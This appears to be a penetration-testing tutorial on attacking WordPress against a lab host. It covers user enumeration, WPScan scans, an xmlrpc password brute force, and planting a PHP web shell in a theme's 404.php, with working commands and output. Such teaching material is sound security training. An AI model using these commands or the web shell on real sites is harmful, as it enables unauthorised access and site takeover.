## Discovery/Footprinting
A quick way to identify a WordPress site is by browsing to the `/robots.txt` file.
The presence of the `/wp-admin` and `/wp-content` directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php` page. This is the login portal to the WordPress instance's back-end.
WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.

There are five types of users on a standard WordPress installation.

1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.
## Enumeration
Another quick way to identify a WordPress site is by looking at the page source. Viewing the page with `cURL` and grepping for `WordPress` can help us confirm that WordPress is in use and footprint the version number, which we should note down for later.
We should spend some time manually browsing the site and looking through the page source for each page, grepping for the `wp-content` directory, `themes` and `plugin`, and begin building a list of interesting data points.

## Enumerating Users
We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at `/wp-login.php`.
A valid username and an invalid password results in the following message:
```
Error: The password you entered for the username admin is incorrect. Lost your password?
```
However, an invalid username returns that the user was not found.
```
Error: The username someone is not registered on this site. If you are unsure of your username, try your email address instead.
```
This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.
## WPScan

[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable.
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.

```shell-session
$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

<SNIP>
```
WPScan uses various passive and active methods to determine versions and vulnerabilities, as shown in the report above. The default number of threads used is `5`. However, this value can be changed using the `-t` flag.

## Attacking WordPress
### Login Bruteforce

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.
```shell
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
## Code Execution
Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.
```php
system($_GET[0]);
```
Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.
```shell
$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

